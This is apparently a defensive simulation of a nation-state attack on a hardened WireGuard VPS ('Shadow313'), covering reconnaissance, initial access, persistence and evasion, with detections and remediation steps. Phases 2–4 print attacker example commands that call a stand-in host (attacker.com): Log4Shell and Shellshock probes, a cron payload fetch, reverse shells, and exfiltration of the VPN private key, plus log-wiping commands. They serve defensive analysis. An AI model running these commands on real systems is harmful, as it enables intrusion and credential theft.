# APT Breach Simulation — Defensive Analysis
## Nation-State Attack vs Shadow313 Hardened VPS
### Red Team Perspective / Blue Team Response

---

## THREAT ACTOR PROFILE

For this simulation we model **APT-X** — a composite of real nation-state TTPs from:
- **APT28 (Fancy Bear)** — Russian GRU, known for VPS targeting
- **APT41 (Double Dragon)** — Chinese MSS, supply chain + zero-day focus
- **Lazarus Group** — DPRK, financial motivation + infrastructure targeting

**Assumed resources:**
- Zero-day budget (1–3 unknown CVEs)
- Custom malware (no commodity tools)
- Patience — willing to operate over weeks/months
- Intelligence on your infrastructure (assume they know your VPS IP)

---

## PHASE 1: RECONNAISSANCE

### What the Attacker Does

```
Week 1: Passive reconnaissance — no packets touch your server yet
```

**Step 1.1 — OSINT on your IP**
```bash
# Attacker runs these from their own infrastructure
whois YOUR_VPS_IP
shodan search "ip:YOUR_VPS_IP"
censys search "ip:YOUR_VPS_IP"
# Checks: ASN, hosting provider, reverse DNS, historical ports
```

**Step 1.2 — Certificate transparency logs**
```bash
# If you got a TLS cert for vpn.yourdomain.com
# Attacker finds it here — free, no packets sent to you
curl "https://crt.sh/?q=yourdomain.com&output=json"
# Reveals: all subdomains, cert issuance dates, infrastructure map
```

**Step 1.3 — Active scanning (first packets hit your server)**
```bash
# Attacker uses distributed scanning — different IPs each time
nmap -sV -sC -p- --open -T2 YOUR_VPS_IP
# T2 = slow scan, harder to detect
# Distributed: each probe from different IP in botnet
```

### Your Defense Response

| Attack Step | Your Detection | Response |
|-------------|---------------|----------|
| OSINT/Shodan | ❌ Not detectable — passive | None possible |
| Cert transparency | ❌ Not detectable — passive | Minimize cert exposure |
| Port scan (single IP) | ✅ Suricata rule 9000002 | Logged, Telegram alert |
| Distributed scan | ⚠️ Partial — per-IP threshold missed | Blind spot (see Phase 5) |
| Banner grabbing | ✅ Suricata + Nginx logs | Logged |
| OS fingerprinting | ✅ Suricata rule 9000004 | Logged, Telegram alert |

### What Attacker Learns About Your Server

After scanning your hardened VPS they see:
```
PORT    STATE  SERVICE    VERSION
443/tcp open   https      nginx (decoy page)
443/udp open   unknown    (WireGuard — looks like HTTPS)
2222/tcp open  ssh        OpenSSH 9.x (custom port)

OS: Linux (kernel version hidden by kptr_restrict)
No other ports open
```

**Attacker assessment**: Non-standard SSH port, WireGuard on 443, Nginx decoy. 
This tells them: *operator is security-conscious, not a default install.*

### Blind Spot #1: Distributed Reconnaissance
Your Suricata rules trigger on **per-IP** thresholds. A nation-state using a 
10,000-node botnet sends 1 packet per IP — never triggers your rate-based rules.

**Mitigation**: Threat intelligence feeds (AbuseIPDB, Emerging Threats) block 
known scanner IPs before they reach your rules.

---

## PHASE 2: INITIAL ACCESS ATTEMPTS

### Attack Vector A: SSH Exploitation

**What they try:**
```bash
# Attempt 1: Default credentials (automated)
ssh root@YOUR_VPS_IP -p 2222
# Result: Blocked — PermitRootLogin no

# Attempt 2: Username enumeration
ssh nonexistent@YOUR_VPS_IP -p 2222
# Result: Blocked — MaxAuthTries 2, Fail2ban triggers after 2 attempts

# Attempt 3: CVE exploitation against OpenSSH
# Example: CVE-2024-6387 (regreSSHion) — race condition in OpenSSH
# Requires: specific OpenSSH version, timing attack, ~10,000 attempts
```

**Your Defense Response:**
```
Attempt 1: Fail2ban logs failed root login → Telegram alert
Attempt 2: After 2 failures → IP banned for 24 hours → Telegram alert
Attempt 3 (regreSSHion): 
  - Requires ~10,000 connection attempts
  - Fail2ban bans after attempt 2 → attack impossible from single IP
  - Distributed attempt: Suricata rule 9000001 triggers on aggregate
  - Auto-updates should have patched this within 24h of disclosure
```

**Detection**: ✅ HIGH confidence
**Blocked**: ✅ YES (for known CVEs with patches applied)
**Blind spot**: Zero-day SSH exploit with single-attempt success

---

### Attack Vector B: WireGuard Protocol Exploitation

**What they try:**
```
WireGuard has an extremely small attack surface:
- No pre-authentication handshake visible to unauthenticated peers
- Server silently drops all packets from unknown public keys
- No version banner, no service identification possible
- Attack surface: ~5,000 lines of kernel code
```

**Your Defense Response:**
```
Suricata rule 9000003: Flags non-WireGuard UDP on port 443
Any probe that doesn't present a valid WireGuard handshake:
  → Server sends NO response (silent drop)
  → Attacker cannot even confirm WireGuard is running
  → Suricata logs the probe
```

**Detection**: ✅ Logged
**Blocked**: ✅ YES — WireGuard's design makes this nearly impossible
**Blind spot**: Zero-day in WireGuard kernel module (extremely rare, 
  mitigated by kernel hardening)

---

### Attack Vector C: Nginx/Web Exploitation

**What they try:**
```bash
# Directory traversal
curl https://YOUR_VPS_IP/../../../etc/passwd

# Log4Shell (if any Java running)
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' https://YOUR_VPS_IP/

# Path traversal via encoded characters
curl "https://YOUR_VPS_IP/%2e%2e/%2e%2e/etc/passwd"

# Shellshock
curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" https://YOUR_VPS_IP/

# Server-Side Request Forgery
curl "https://YOUR_VPS_IP/?url=http://169.254.169.254/latest/meta-data/"
```

**Your Defense Response:**
```
Log4Shell:        ✅ Suricata rules 9000012/9000013 detect and alert
Path traversal:   ✅ Nginx returns 404, Suricata web_appsec rules log
Shellshock:       ✅ Suricata web_rules detect
SSRF:             ⚠️ Partial — depends on Nginx config
AppArmor:         ✅ Nginx confined — cannot read /etc/passwd even if exploited
```

**Detection**: ✅ HIGH confidence
**Blocked**: ✅ YES for known attacks
**Blind spot**: Zero-day in Nginx itself (mitigated by AppArmor confinement)

---

### Attack Vector D: Supply Chain Attack

**What they try:**
```
Nation-state approach: compromise an upstream package
Example: XZ Utils backdoor (CVE-2024-3094) — real 2024 attack
  - Attacker contributes to open source project for 2 years
  - Inserts backdoor into compression library
  - Backdoor activates only when specific conditions met
  - Affects: systemd-linked SSH on specific distros
```

**Your Defense Response:**
```
AIDE:     ✅ Detects if /usr/bin/xz changes after package update
Wazuh:    ✅ File integrity monitoring on /usr/bin, /usr/lib
Auditd:   ✅ Logs all writes to monitored paths
Auto-updates: ⚠️ RISK — auto-updates could install compromised package
              before detection
```

**Detection**: ✅ AIDE detects binary change
**Blocked**: ⚠️ PARTIAL — AIDE detects AFTER installation
**Blind spot**: Window between package install and AIDE daily check

---

### Attack Vector E: Honeypot Interaction (Attacker Tests Your Defenses)

**What they try:**
```bash
# Attacker probes port 3306 (MySQL honeypot)
nc YOUR_VPS_IP 3306
# Receives: MySQL banner (fake)
# Tries: default credentials
```

**Your Defense Response:**
```
Honeypot:  ✅ Connection logged immediately
Telegram:  ✅ Alert sent within 1 second
Auto-block: ✅ Attacker IP blocked via iptables
Wazuh:     ✅ Event correlated with other activity from same IP
```

**Detection**: ✅ IMMEDIATE
**Blocked**: ✅ YES — IP auto-blocked on first touch
**Intelligence gained**: You now know their IP, timing, what they probed

---

## PHASE 3: EXECUTION AND PERSISTENCE (IF INITIAL ACCESS SUCCEEDED)

*Assume worst case: attacker found a zero-day and has a shell*

### Step 3.1 — What Attacker Does Immediately

```bash
# First 60 seconds after shell access:
id && whoami && hostname
uname -a
cat /etc/os-release
ps aux
ss -tulpn
cat /etc/passwd | grep -v nologin
ls /home/
cat /etc/wireguard/wg0.conf  # Primary target — steal VPN keys
cat /etc/wireguard/server_private.key
ls /etc/wireguard/clients/   # Secondary target — client configs
```

### Your Defense Response to Post-Exploitation

**Auditd catches everything:**
```
# Every command logged:
type=SYSCALL msg=audit(timestamp): arch=x86_64 syscall=openat
  success=yes exit=3 a0=AT_FDCWD a1=0x... a2=O_RDONLY
  comm="cat" exe="/usr/bin/cat"
  key="identity"  ← triggered by /etc/passwd watch

# Wazuh correlates:
  - File access to /etc/wireguard → Rule 100005 → Level 15 alert
  - Telegram: "WireGuard config file accessed!"
```

**AppArmor confinement:**
```
If attacker got shell via Nginx exploit:
  - AppArmor profile for nginx: cannot read /etc/wireguard
  - Cannot execute /bin/bash
  - Cannot write to /tmp
  - Attempt logged: kernel: audit: apparmor="DENIED"
```

**ptrace_scope=2:**
```
Attacker tries to inject into another process:
  - ptrace() returns EPERM
  - Cannot dump memory of other processes
  - Cannot attach debugger to running processes
```

### Step 3.2 — Persistence Attempts

```bash
# Attacker tries to establish persistence:

# Method 1: Cron job
echo "* * * * * curl http://attacker.com/shell.sh | bash" >> /etc/crontab

# Method 2: SSH authorized key
echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys

# Method 3: Systemd service
cat > /etc/systemd/system/update-helper.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
EOF

# Method 4: LD_PRELOAD rootkit
echo "/lib/x86_64-linux-gnu/libevil.so" >> /etc/ld.so.preload
```

**Your Defense Response:**

| Persistence Method | Detection | Response |
|-------------------|-----------|----------|
| Cron modification | ✅ AIDE detects /etc change | Alert + log |
| SSH key addition | ✅ AIDE + Wazuh FIM on /root/.ssh | Alert + log |
| Systemd service | ✅ AIDE detects /etc/systemd change | Alert + log |
| LD_PRELOAD rootkit | ✅ AIDE detects /etc/ld.so.preload | Alert + log |
| Kernel module rootkit | ✅ Wazuh rootcheck | Alert + log |
| Reverse shell outbound | ✅ Suricata rule 9000006/9000007 | Alert + log |
| C2 beacon | ✅ Suricata beacon detection | Alert + log |

**Critical**: AIDE runs every 24 hours by default. 
A sophisticated attacker has a **24-hour window** before file changes are detected.

**Fix**: Enable AIDE realtime monitoring:
```bash
# Already configured for /etc with realtime="yes" in Wazuh syscheck
# This closes the 24-hour window for /etc changes
# For /usr/bin realtime monitoring:
sudo inotifywait -m -r /usr/bin /usr/sbin /bin /sbin \
  -e modify,create,delete,move \
  --format '%T %w %f %e' \
  --timefmt '%Y-%m-%d %H:%M:%S' | \
  while read line; do
    shadow313-alert "FILE CHANGE DETECTED: $line"
  done
```

---

## PHASE 4: DEFENSE EVASION TECHNIQUES

### Evasion A: Log Tampering

**What they try:**
```bash
# Clear auth logs
echo "" > /var/log/auth.log
shred -u /var/log/auth.log

# Disable auditd
systemctl stop auditd
kill -9 $(pgrep auditd)

# Modify timestamps
touch -t 202001010000 /var/log/auth.log
```

**Your Defense Response:**
```
Wazuh:    ✅ Detects log file deletion/truncation (rule: 591)
Auditd:   ✅ Logs its own shutdown — "auditd stopping" is itself an alert
Remote logging: ⚠️ BLIND SPOT — logs only stored locally
                   If attacker deletes logs before Wazuh reads them: gap
```

**Fix — Remote log shipping:**
```bash
# Ship logs to a separate server in real-time
# Attacker cannot delete logs they cannot reach

# Install rsyslog remote forwarding
sudo apt install -y rsyslog

sudo tee /etc/rsyslog.d/99-shadow313-remote.conf << 'EOF'
# Forward all logs to remote syslog server
*.* @@REMOTE_LOG_SERVER_IP:514
# Use TCP (@@) not UDP (@) for reliability
EOF

sudo systemctl restart rsyslog
```

---

### Evasion B: Living Off the Land (LOLBins)

**What they try:**
```bash
# Use legitimate system tools for malicious purposes
# No new binaries dropped — evades signature detection

# Data exfiltration via curl (legitimate tool)
curl -X POST https://attacker.com/exfil \
  -d @/etc/wireguard/server_private.key

# Reverse shell via Python (already installed)
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# DNS exfiltration (bypasses most firewalls)
cat /etc/wireguard/server_private.key | xxd | \
  while read line; do
    dig $(echo $line | base64).attacker.com
  done
```

**Your Defense Response:**
```
curl exfil:      ✅ Suricata monitors outbound — large POST to unknown IP flagged
Python shell:    ✅ Suricata reverse shell rules (9000006/9000007)
DNS exfiltration: ✅ Suricata rule 9000010 — long subdomain labels detected
AppArmor:        ✅ If process is confined, outbound connections blocked
```

**Blind spot**: LOLBin activity that looks exactly like legitimate admin work.
Example: `curl` downloading a "system update" from attacker-controlled CDN.

---

### Evasion C: Timing Attacks (Operating in Blind Windows)

**What they try:**
```
Nation-state patience: operate only during your sleep hours
AIDE runs at 2am daily — attacker operates 2:01am to 1:59am next day
Make changes, exfiltrate, then REVERT changes before AIDE runs
```

**Your Defense Response:**
```
Wazuh realtime: ✅ /etc monitored in realtime — catches changes immediately
AIDE daily:     ⚠️ /usr/bin only checked daily — 24h window exists
Auditd:         ✅ Syscall-level logging — every file open logged regardless
```

**Fix**: Run AIDE more frequently:
```bash
# Change from daily to every 6 hours
sudo tee /etc/cron.d/aide-frequent << 'EOF'
0 */6 * * * root /usr/bin/aide --check 2>&1 | logger -t aide
EOF
```

---

### Evasion D: Encrypted C2 Over Port 443

**What they try:**
```
Attacker establishes C2 over HTTPS to a legitimate-looking domain
Traffic: encrypted, port 443, valid TLS certificate
Looks identical to normal web browsing
Beacon interval: randomized (defeats Suricata CV detection)
Domain: registered 6 months ago, low entropy name
```

**Your Defense Response:**
```
Suricata:       ⚠️ Cannot decrypt TLS — sees encrypted blob
JA3/JARM:       ✅ TLS fingerprint may match known C2 frameworks
Domain age:     ⚠️ Not implemented yet — needs threat intel feed
Beacon CV:      ⚠️ Randomized intervals defeat fixed CV threshold
```

**This is the most realistic blind spot for encrypted C2.**

**Fix — JA3 fingerprinting in Suricata:**
```bash
# Add to suricata.yaml outputs section
# JA3 fingerprinting is built into Suricata
# Enable in eve-log:
#   - tls:
#       ja3: yes
#       ja3s: yes

# Then add rules for known C2 JA3 hashes:
sudo tee -a /etc/suricata/rules/shadow313.rules << 'EOF'
# Cobalt Strike JA3 fingerprint
alert tls any any -> any any (msg:"Shadow313 Cobalt Strike JA3"; \
  ja3.hash; content:"51c64c77e60f3980eea90869b68c58a8"; \
  classtype:trojan-activity; sid:9000020; rev:1;)

# Metasploit JA3
alert tls any any -> any any (msg:"Shadow313 Metasploit JA3"; \
  ja3.hash; content:"6734f37431670b3ab4292b8f60f29984"; \
  classtype:trojan-activity; sid:9000021; rev:1;)
EOF
```

---

## PHASE 5: COMPLETE BLIND SPOT ANALYSIS

### Blind Spot Summary Table

| Blind Spot | Severity | Exploitability | Fix |
|------------|----------|---------------|-----|
| Distributed port scanning (1 pkt/IP) | LOW | Easy | Threat intel IP blocklist |
| Zero-day SSH exploit (single attempt) | CRITICAL | Hard (expensive) | Minimize SSH exposure |
| Zero-day Nginx exploit | HIGH | Medium | AppArmor confinement (already done) |
| Supply chain (compromised package) | HIGH | Medium | Package signing verification |
| 24h AIDE window on /usr/bin | MEDIUM | Medium | Increase AIDE frequency |
| Local-only logs (tamperable) | HIGH | Easy | Remote log shipping |
| Encrypted C2 over HTTPS | HIGH | Medium | JA3 fingerprinting |
| Distributed C2 (no single IP) | MEDIUM | Medium | Behavioral analysis |
| Insider threat (you) | N/A | N/A | Operational security |
| Physical VPS seizure | CRITICAL | Hard (legal) | Jurisdiction + encryption |

---

## PHASE 6: REMEDIATION ROADMAP

### Immediate (Do Today)

```bash
# 1. Remote log shipping — closes log tampering blind spot
sudo apt install -y rsyslog
# Configure forwarding to a second cheap VPS or your laptop

# 2. Increase AIDE frequency
sudo tee /etc/cron.d/aide-frequent << 'EOF'
0 */4 * * * root /usr/bin/aide --check 2>&1 | logger -t aide-check
EOF

# 3. Enable JA3 in Suricata
sudo sed -i 's/# ja3: yes/ja3: yes/' /etc/suricata/suricata.yaml
sudo systemctl restart suricata

# 4. Add AbuseIPDB threat intel to Fail2ban
# Automatically blocks IPs with known malicious history
sudo tee /etc/fail2ban/action.d/abuseipdb.conf << 'EOF'
[Definition]
actionban = curl -s https://api.abuseipdb.com/api/v2/report \
  --data-urlencode "ip=<ip>" \
  -d "categories=18,22" \
  -d "comment=Shadow313 VPS brute force" \
  -H "Key: YOUR_ABUSEIPDB_API_KEY" \
  -H "Accept: application/json"
EOF
```

---

### Short Term (This Week)

```bash
# 5. Minimize SSH exposure — only allow from VPN
# After WireGuard is working, restrict SSH to VPN clients only
sudo ufw delete allow 2222/tcp
sudo ufw allow from 10.13.13.0/24 to any port 2222 proto tcp
# Now SSH is only accessible through your VPN — eliminates entire SSH attack surface

# 6. Add threat intelligence feed to Suricata
sudo suricata-update enable-source abuse.ch/feodotracker  # C2 IPs
sudo suricata-update enable-source abuse.ch/sslbl         # Malicious SSL certs
sudo suricata-update enable-source abuse.ch/urlhaus       # Malicious URLs
sudo suricata-update

# 7. Enable process accounting
sudo apt install -y acct
sudo accton on
# Logs every command executed by every user — forensic gold
```

---

### Medium Term (This Month)

```bash
# 8. Deploy a second VPS as log aggregator
# All logs from primary VPS ship here in real-time
# Attacker cannot delete logs they cannot reach

# 9. Implement canary tokens (beyond file canaries)
# Free service: canarytokens.org
# Deploy:
#   - DNS canary token in /etc/wireguard/README.txt
#   - HTTP canary token in Nginx 404 page
#   - AWS key canary in fake credentials file
# If attacker uses any of these → instant alert with their IP

# 10. Consider moving SSH to WireGuard-only access
# Zero exposed services = zero attack surface
# Only WireGuard port 443/UDP exposed to internet
# Everything else (SSH, dashboard, DNS) only accessible via VPN
```

---

## ATTACK TIMELINE VISUALIZATION

```
T+0h    Attacker discovers your VPS IP (OSINT — undetectable)
T+1h    Passive reconnaissance complete (undetectable)
T+2h    Active port scan begins
          → Suricata detects, Telegram alert sent to you
          → Attacker IP logged
T+2h    Attacker probes honeypot port 3306
          → Immediate detection, IP auto-blocked, Telegram alert
T+3h    Attacker rotates to new IP, tries SSH brute force
          → Fail2ban bans after 2 attempts, Telegram alert
T+4h    Attacker tries Log4Shell against Nginx
          → Suricata detects, Telegram alert
          → AppArmor prevents exploitation even if Nginx vulnerable
T+5h    Attacker gives up on automated attacks
          → Escalates to zero-day budget (expensive, rare)

IF zero-day used:
T+6h    Attacker gets shell via zero-day
          → Auditd logs every command immediately
          → Wazuh detects file access to /etc/wireguard → Level 15 alert
          → Telegram: "WireGuard config accessed!"
T+6h    Attacker tries to read server_private.key
          → AppArmor may block (if shell is confined process)
          → Auditd logs the access regardless
T+6h    Attacker tries reverse shell outbound
          → Suricata detects outbound shell
          → nftables logs suspicious outbound port
T+7h    You receive 6+ Telegram alerts, SSH in, investigate
          → Kill attacker session
          → Rotate WireGuard keys
          → Analyze auditd logs for full attack chain
```

---

## WHAT A NATION-STATE ACTUALLY DOES DIFFERENTLY

Honest assessment — a well-resourced nation-state with specific targeting:

1. **They don't scan** — they already know your infrastructure from OSINT
2. **They use zero-days** — your patched CVEs are irrelevant to them
3. **They target YOU, not your server** — phishing your laptop is easier than 
   hacking your hardened VPS. Your laptop is the weakest link.
4. **They compromise your upstream** — hosting provider, ISP, or a library 
   you use. Your server hardening doesn't help here.
5. **They are patient** — they may watch for months before acting

**The honest conclusion**: Your hardened VPS defeats:
- ✅ 99.9% of automated/opportunistic attacks
- ✅ 95% of skilled individual attackers
- ✅ 80% of organized criminal groups
- ⚠️ 40-60% of APT groups (depends on zero-day budget)
- ❌ A nation-state with specific targeting and unlimited resources

**The most effective defense against nation-state targeting is not technical** — 
it is operational security: not making yourself a target, not storing sensitive 
data on internet-connected systems, and using air-gapped systems for the most 
sensitive operations.

---

## INCIDENT RESPONSE CHECKLIST

If you receive multiple Telegram alerts in quick succession:

```bash
# 1. Immediately check what's happening
ssh -p 2222 -i ~/.ssh/shadow313_vpn operator@YOUR_VPS_IP

# 2. See who is connected right now
who
w
last | head -20
ss -tnp

# 3. Check running processes for anomalies
ps auxf
# Look for: unusual process names, processes running as root unexpectedly

# 4. Check recent commands (auditd)
sudo ausearch -ts recent | grep -E "execve|openat" | tail -50

# 5. Check file integrity
sudo aide --check 2>&1 | grep -E "changed|added|removed"

# 6. Check Suricata alerts
sudo tail -100 /var/log/suricata/fast.log

# 7. Check honeypot events
sudo tail -50 /var/log/shadow313/honeypot.log

# 8. If compromised — isolate immediately
sudo ufw default deny outgoing  # Block all outbound
sudo wg-quick down wg0          # Disconnect VPN clients
# Take snapshot of VPS for forensics before cleaning

# 9. Rotate all keys after incident
# - WireGuard server keys
# - SSH keys
# - Any API keys stored on server
```